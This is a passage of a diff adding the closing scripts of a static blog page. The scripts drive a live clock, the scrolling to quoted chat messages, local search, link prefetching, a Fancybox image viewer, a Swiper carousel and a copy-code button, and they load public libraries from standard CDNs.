+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.7.0/style.min.css" media="all">
+
+
+
+<!-- inject -->
+
+</div></body></html>
